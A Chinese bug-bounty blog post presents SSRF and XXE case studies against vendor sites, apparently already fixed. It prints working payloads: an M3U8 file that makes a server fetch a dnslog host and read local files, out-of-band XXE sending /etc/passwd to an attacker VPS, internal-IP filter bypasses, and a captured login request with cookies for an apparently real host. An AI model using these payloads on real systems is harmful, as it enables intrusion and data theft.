<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>SRC挖洞之SSRF与XXE漏洞的实战案例 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="SRC挖洞之SSRF与XXE漏洞的实战案例" />
<meta property="og:description" content="文章目录 前言SSRF漏洞案例1 某翻译网SSRF可通内网案例2 某翻译网SSRF防护绕过案例3 某站SSRF读取本地文件案例4 某站视频解析导致SSRF案例5 某狗主站SSRF多种绕过案例6 某乎网SSRF可探测内网 XXE漏洞案例1 用友某软件存在XXE漏洞案例2 XFire 开发组件XXE漏洞案例3 博客搬家功能处XXE漏洞案例4 用友某软件存在XXE盲注 总结 前言 前面一篇文章 SRC挖洞之文件上传/下载漏洞的实战案例 介绍了 任意文件下载漏洞 和 任意文件上传漏洞，本文收集讲述下 SSRF 漏洞和 XXE 漏洞的 SRC 和漏洞平台的一些实战案例。关于这两个漏洞的一些介绍和检测方法，读者可阅读我的另一篇博文：浅析DNSlog在渗透测试中的实战技巧。
【严正声明】本文所述的所有漏洞案例，厂商均已成功修复，同时对应的关键信息均已打码！网络安全十八双刃剑，请各位读者遵纪守法，共同维护良好健康的网络环境！
SSRF漏洞 关于 SSRF 漏洞的基础原理和知识，可以看我的另一篇博文进行了解：Web安全-SSRF漏洞，SSRF 漏洞有时候会被厂商当作鸡肋的漏洞，但有时候却能产生巨大危害，具体危害等级需要看是否能有效利用。
案例1 某翻译网SSRF可通内网 1、某翻译网在输入框参数存在 SSRF 漏洞：
2、内网主机服务探测：
案例2 某翻译网SSRF防护绕过 1、针对的是上面案例 1 同家厂商，修复完成后存在绕过，原始 Payload 无效：
2、使用 Payload：http://10.100.21.7.xip.io 绕过：
案例3 某站SSRF读取本地文件 1、某企业废弃的站点存在 SSRF 可读取本地文件：
2、也可探测内网：
案例4 某站视频解析导致SSRF 1、某站存在上传视频的功能：
2、构造恶意视频 Payload，由于该功能处对视频有最小文件大小要求，后续可用任意内容填充：
#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, concat:http://pictest.66ae2b.dnslog.info|file:///proc/sys/kernel/hostname #EXT-X-ENDLIST ... 3、上传视频并让服务端进行解码，解码过程中解析漏洞导致 SSRF，Cloudeye 的日志如下：" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/811510873f281086f648e3e969d2c434/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-05-31T23:50:10+08:00" />
<meta property="article:modified_time" content="2021-05-31T23:50:10+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">SRC挖洞之SSRF与XXE漏洞的实战案例</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#_2" rel="nofollow">前言</a></li><li><a href="#SSRF_7" rel="nofollow">SSRF漏洞</a></li><li><ul><li><a href="#1_SSRF_10" rel="nofollow">案例1 某翻译网SSRF可通内网</a></li><li><a href="#2_SSRF_15" rel="nofollow">案例2 某翻译网SSRF防护绕过</a></li><li><a href="#3_SSRF_20" rel="nofollow">案例3 某站SSRF读取本地文件</a></li><li><a href="#4_SSRF_25" rel="nofollow">案例4 某站视频解析导致SSRF</a></li><li><a href="#5_SSRF_41" rel="nofollow">案例5 某狗主站SSRF多种绕过</a></li><li><a href="#6_SSRF_48" rel="nofollow">案例6 某乎网SSRF可探测内网</a></li></ul> 
  </li><li><a href="#XXE_55" rel="nofollow">XXE漏洞</a></li><li><ul><li><a href="#1_XXE_58" rel="nofollow">案例1 用友某软件存在XXE漏洞</a></li><li><a href="#2_XFire_XXE_64" rel="nofollow">案例2 XFire 开发组件XXE漏洞</a></li><li><a href="#3_XXE_91" rel="nofollow">案例3 博客搬家功能处XXE漏洞</a></li><li><a href="#4_XXE_154" rel="nofollow">案例4 用友某软件存在XXE盲注</a></li></ul> 
  </li><li><a href="#_197" rel="nofollow">总结</a></li></ul> 
</div> 
<p></p> 
<h2><a id="_2"></a>前言</h2> 
<p>前面一篇文章 <a href="https://bwshen.blog.csdn.net/article/details/117394463" rel="nofollow">SRC挖洞之文件上传/下载漏洞的实战案例</a> 介绍了 任意文件下载漏洞 和 任意文件上传漏洞，本文收集讲述下 SSRF 漏洞和 XXE 漏洞的 SRC 和漏洞平台的一些实战案例。关于这两个漏洞的一些介绍和检测方法，读者可阅读我的另一篇博文：<a href="https://bwshen.blog.csdn.net/article/details/117197126" rel="nofollow">浅析DNSlog在渗透测试中的实战技巧</a>。</p> 
<p>【严正声明】本文所述的所有漏洞案例，厂商均已成功修复，同时对应的关键信息均已打码！网络安全十八双刃剑，请各位读者遵纪守法，共同维护良好健康的网络环境！</p> 
<h2><a id="SSRF_7"></a>SSRF漏洞</h2> 
<p>关于 SSRF 漏洞的基础原理和知识，可以看我的另一篇博文进行了解：<a href="https://blog.csdn.net/weixin_39190897/article/details/88226410">Web安全-SSRF漏洞</a>，SSRF 漏洞有时候会被厂商当作鸡肋的漏洞，但有时候却能产生巨大危害，具体危害等级需要看是否能有效利用。</p> 
<h3><a id="1_SSRF_10"></a>案例1 某翻译网SSRF可通内网</h3> 
<p>1、某翻译网在输入框参数存在 SSRF 漏洞：<br> <img src="https://images2.imgbox.com/aa/55/jcL7eQB1_o.png" alt="在这里插入图片描述">2、内网主机服务探测：<br> <img src="https://images2.imgbox.com/25/9e/ibHZzas9_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="2_SSRF_15"></a>案例2 某翻译网SSRF防护绕过</h3> 
<p>1、针对的是上面案例 1 同家厂商，修复完成后存在绕过，原始 Payload 无效：<br> <img src="https://images2.imgbox.com/17/95/HWouAmBZ_o.png" alt="在这里插入图片描述">2、使用 Payload：<code>http://10.100.21.7.xip.io</code> 绕过：<br> <img src="https://images2.imgbox.com/44/f7/NyueTlNW_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="3_SSRF_20"></a>案例3 某站SSRF读取本地文件</h3> 
<p>1、某企业废弃的站点存在 SSRF 可读取本地文件：<br> <img src="https://images2.imgbox.com/d2/09/frlziwh1_o.png" alt="在这里插入图片描述">2、也可探测内网：<br> <img src="https://images2.imgbox.com/73/35/cQYdReFe_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="4_SSRF_25"></a>案例4 某站视频解析导致SSRF</h3> 
<p>1、某站存在上传视频的功能：<br> <img src="https://images2.imgbox.com/bc/2c/2w4370ga_o.png" alt="在这里插入图片描述"><br> 2、构造恶意视频 Payload，由于该功能处对视频有最小文件大小要求，后续可用任意内容填充：</p> 
<pre><code class="prism language-js">#<span class="token constant">EXTM3U</span>
#<span class="token constant">EXT</span><span class="token operator">-</span><span class="token constant">X</span><span class="token operator">-</span><span class="token constant">MEDIA</span><span class="token operator">-</span><span class="token constant">SEQUENCE</span><span class="token operator">:</span><span class="token number">0</span>
#<span class="token constant">EXTINF</span><span class="token operator">:</span><span class="token number">10.0</span><span class="token punctuation">,</span>
concat<span class="token operator">:</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">pictest.66ae2b.dnslog.info|file:</span><span class="token regex-delimiter">/</span></span><span class="token comment">//proc/sys/kernel/hostname</span>
#<span class="token constant">EXT</span><span class="token operator">-</span><span class="token constant">X</span><span class="token operator">-</span><span class="token constant">ENDLIST</span>
<span class="token operator">...</span>
</code></pre> 
<p>3、上传视频并让服务端进行解码，解码过程中解析漏洞导致 SSRF，Cloudeye 的日志如下：<br> <img src="https://images2.imgbox.com/ea/f7/4mzp2bFf_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="5_SSRF_41"></a>案例5 某狗主站SSRF多种绕过</h3> 
<p>1、有简单的过滤，比如会检测IP地址是否为内网 IP：<br> <img src="https://images2.imgbox.com/53/fd/iJdCg2eT_o.png" alt="在这里插入图片描述">2、可以将 IP 转换为 10 进制后绕过;<br> <img src="https://images2.imgbox.com/61/0f/iHW3vFGO_o.png" alt="在这里插入图片描述">3、当输入 XXgou-inc 的时候也会检测：<br> <img src="https://images2.imgbox.com/3b/c8/oRcMeFqY_o.png" alt="在这里插入图片描述">4、通过生成短域名就能绕过（<a href="http://92.xswzl.cn/" rel="nofollow">短域名在线生成转换网址</a>）：<br> <img src="https://images2.imgbox.com/6f/aa/aG1BHae7_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="6_SSRF_48"></a>案例6 某乎网SSRF可探测内网</h3> 
<p>1、某乎回答问题的时候，输入网址将自动被转换为标题，比如输入<code>http://wooyun.org/</code>，将会变成：<br> <img src="https://images2.imgbox.com/b0/e5/eLHuZuji_o.png" alt="在这里插入图片描述">2、明显是后台进行了请求，进行抓包：<br> <img src="https://images2.imgbox.com/7f/89/I0bFeCn6_o.png" alt="在这里插入图片描述">3、这里如果控制不好请求的对象，将造成 SSRF 漏洞，请求到一些内网地址或内部人员才能访问的地址，导致敏感信息泄露。由于我找不到内网网段，就以 127.0.0.1 为例，<code>www.127.0.0.1.xip.io</code> 是解析到 127.0.0.1 的，请求可以发现 get 成功：<br> <img src="https://images2.imgbox.com/9d/07/RfRO35Rr_o.png" alt="在这里插入图片描述">4、包括我正常访问不到的网址<code>https://status.XXX.com/login</code>，如下图：<br> <img src="https://images2.imgbox.com/ad/f1/oTs4SYK1_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="XXE_55"></a>XXE漏洞</h2> 
<p>关于 XXE 漏洞的基础知识和原理，可以看我的另一篇博文：<a href="https://blog.csdn.net/weixin_39190897/article/details/103237488">Web安全-XXE漏洞</a>。</p> 
<h3><a id="1_XXE_58"></a>案例1 用友某软件存在XXE漏洞</h3> 
<p>1、用友某软件，找个接口，先提交请求：<br> <img src="https://images2.imgbox.com/42/72/faG4x6HY_o.png" alt="在这里插入图片描述">2、该请求存在 XXE 漏洞：<br> <img src="https://images2.imgbox.com/7f/d0/PFn6J4nW_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="2_XFire_XXE_64"></a>案例2 XFire 开发组件XXE漏洞</h3> 
<p>1、XFire 是流行的 Webservice 开发组件，其在 invoke 时使用了 STAX 解析 XML 导致 XML 实体注入漏洞。常见的 URL 形式为：<code>http://XXX.com/services/IVerification?wsdl</code>，如下图所示：<br> <img src="https://images2.imgbox.com/49/20/MftxUqiU_o.png" alt="在这里插入图片描述"><br> 2、自己定义 XML 文件如下：</p> 
<pre><code class="prism language-xml">&lt;!ENTITY % a SYSTEM "file:///"&gt; 
&lt;!ENTITY % b "&lt;!ENTITY <span class="token entity" title="%">&amp;#37;</span> c SYSTEM 'gopher://ip:port/%a;'&gt;"&gt; %b; %c;
</code></pre> 
<p>将 xml 文件保存在 vps 中，为<code>http://ip:port/1.xml</code>，然后构造如下 Payload：</p> 
<pre><code class="prism language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % remote SYSTEM "http://ip:port/1.xml"&gt;%remote;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>可成功利用 XXE 漏洞读取服务器文件：<br> <img src="https://images2.imgbox.com/26/dc/TOYbbhdW_o.png" alt="在这里插入图片描述"><br> 3、我们可以修改外部加载的 xml 文件为任意目录路径或者是特定的文件，以读取<code>/etc/passwd</code>为例，对应 xml 文件为：</p> 
<pre><code class="prism language-xml">&lt;!ENTITY % a SYSTEM "file:///etc/passwd"&gt; 
&lt;!ENTITY % b "&lt;!ENTITY <span class="token entity" title="%">&amp;#37;</span> c SYSTEM 'gopher://ip:port/%a;'&gt;"&gt; %b; %c
</code></pre> 
<p>运行结果如下：<br> <img src="https://images2.imgbox.com/15/5e/ER9MYjTv_o.png" alt=""></p> 
<h3><a id="3_XXE_91"></a>案例3 博客搬家功能处XXE漏洞</h3> 
<p>1、某博客网站提供博客搬家的功能，即可以通过导入 XML 添加博客。链接：http://XXXblogs.com/Import.aspx?catid=1，验证 XXE 漏洞的 Payload：</p> 
<pre><code class="prism language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">
	&lt;!ENTITY test SYSTEM "file:///C://WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rss</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.0<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>dc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://purl.org/dc/elements/1.1/<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>trackback</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://madskills.com/public/xml/rss/module/trackback/<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>wfw</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://wellformedweb.org/CommentAPI/<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>slash</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://purl.org/rss/1.0/modules/slash/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>channel</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>博客园-阔爱的贝贝<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span><span class="token punctuation">&gt;</span></span>http://www.cnblogs.com/kuoaidebb/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>link</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>一枚想当黑客的程序媛<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>language</span><span class="token punctuation">&gt;</span></span>zh-cn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>language</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastBuildDate</span><span class="token punctuation">&gt;</span></span>Sun, 03 May 2015 11:19:00 GMT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastBuildDate</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pubDate</span><span class="token punctuation">&gt;</span></span>Sun, 03 May 2015 11:19:00 GMT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pubDate</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ttl</span><span class="token punctuation">&gt;</span></span>60<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ttl</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>item</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>test]]<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;test;">&amp;test;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span><span class="token punctuation">&gt;</span></span>http://www.cnblogs.com/kuoaidebb/archive/2015/05/03/4474500.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>link</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dc:</span>creator</span><span class="token punctuation">&gt;</span></span>阔爱的贝贝<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dc:</span>creator</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">&gt;</span></span>阔爱的贝贝<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pubDate</span><span class="token punctuation">&gt;</span></span>Sun, 03 May 2015 11:13:00 GMT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pubDate</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>guid</span><span class="token punctuation">&gt;</span></span>http://www.cnblogs.com/kuoaidebb/archive/2015/05/03/4474500.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>guid</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span><span class="token cdata">&lt;![CDATA[&lt;p&gt;]]&amp;gt;&lt;/p&gt;]]&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>item</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>channel</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rss</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>可成功读取 hosts 文件：<br> <img src="https://images2.imgbox.com/0c/3e/n7xlzE3e_o.png" alt="在这里插入图片描述"><br> 2、验证 F 盘是否存在，Payload：</p> 
<pre><code class="prism language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">
	&lt;!ENTITY test SYSTEM "file:///F://test"&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rss</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.0<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>dc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://purl.org/dc/elements/1.1/<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>trackback</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://madskills.com/public/xml/rss/module/trackback/<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>wfw</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://wellformedweb.org/CommentAPI/<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>slash</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://purl.org/rss/1.0/modules/slash/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>channel</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>博客园-阔爱的贝贝<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span><span class="token punctuation">&gt;</span></span>http://www.cnblogs.com/kuoaidebb/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>link</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>一枚想当黑客的程序媛<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>language</span><span class="token punctuation">&gt;</span></span>zh-cn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>language</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastBuildDate</span><span class="token punctuation">&gt;</span></span>Sun, 03 May 2015 11:19:00 GMT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastBuildDate</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pubDate</span><span class="token punctuation">&gt;</span></span>Sun, 03 May 2015 11:19:00 GMT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pubDate</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ttl</span><span class="token punctuation">&gt;</span></span>60<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ttl</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>item</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>test]]<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;test;">&amp;test;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span><span class="token punctuation">&gt;</span></span>http://www.cnblogs.com/kuoaidebb/archive/2015/05/03/4474500.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>link</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dc:</span>creator</span><span class="token punctuation">&gt;</span></span>阔爱的贝贝<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dc:</span>creator</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">&gt;</span></span>阔爱的贝贝<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pubDate</span><span class="token punctuation">&gt;</span></span>Sun, 03 May 2015 11:13:00 GMT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pubDate</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>guid</span><span class="token punctuation">&gt;</span></span>http://www.cnblogs.com/kuoaidebb/archive/2015/05/03/4474500.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>guid</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span><span class="token cdata">&lt;![CDATA[&lt;p&gt;]]&amp;gt;&lt;/p&gt;]]&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>item</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>channel</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rss</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>结果如下：<br> <img src="https://images2.imgbox.com/e7/4c/kmB4fGZN_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="4_XXE_154"></a>案例4 用友某软件存在XXE盲注</h3> 
<p>1、用友某软件在登陆及重置密码处理时，使用 xml 将用户名、密码及验证码传递给后端进行解析处理，而后端对传进来的 xml 文件并未作严谨验证导致，可以传进构造的恶意 xml 文件进行查看文件：<br> <img src="https://images2.imgbox.com/1c/d4/AqNto3TD_o.png" alt="在这里插入图片描述">2、登陆抓包：<br> <img src="https://images2.imgbox.com/fa/63/ELaNqP9o_o.png" alt="在这里插入图片描述"><br> 完整数据包如下：</p> 
<pre><code class="prism language-py">POST <span class="token operator">/</span>hrss<span class="token operator">/</span>dorado<span class="token operator">/</span>smartweb2<span class="token punctuation">.</span>RPC<span class="token punctuation">.</span>d?__rpc<span class="token operator">=</span>true HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> ehr<span class="token punctuation">.</span>mc2<span class="token punctuation">.</span>cn
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">975</span>
Pragma<span class="token punctuation">:</span> no<span class="token operator">-</span>cache
Origin<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span>ehr<span class="token punctuation">.</span>mc2<span class="token punctuation">.</span>cn
User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">6.1</span><span class="token punctuation">;</span> WOW64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">42.0</span><span class="token number">.2311</span><span class="token number">.90</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Accept<span class="token punctuation">:</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span>
Referer<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span>ehr<span class="token punctuation">.</span>mc2<span class="token punctuation">.</span>cn<span class="token operator">/</span>hrss<span class="token operator">/</span>login<span class="token punctuation">.</span>jsp
Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate
Accept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span>
Cookie<span class="token punctuation">:</span> JSESSIONID<span class="token operator">=</span><span class="token number">1DDABBA58198490936C35195E361359A.</span>server<span class="token punctuation">;</span> user<span class="token operator">=</span><span class="token number">123123</span><span class="token punctuation">;</span> JSESSIONID<span class="token operator">=</span><span class="token number">96A12531BB510FF28B84E523AECD5BDC.</span>server
__type<span class="token operator">=</span>updateData<span class="token operator">&amp;</span>__viewInstanceId<span class="token operator">=</span>nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>hrss<span class="token punctuation">.</span>login<span class="token punctuation">.</span>Login<span class="token operator">~</span>nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>hrss<span class="token punctuation">.</span>login<span class="token punctuation">.</span>LoginViewModel<span class="token operator">&amp;</span>__xml<span class="token operator">=</span><span class="token operator">%</span>3Crpc<span class="token operator">%</span>20transaction<span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span>
</code></pre> 
<p>3、将 pos t内容 unescape：</p> 
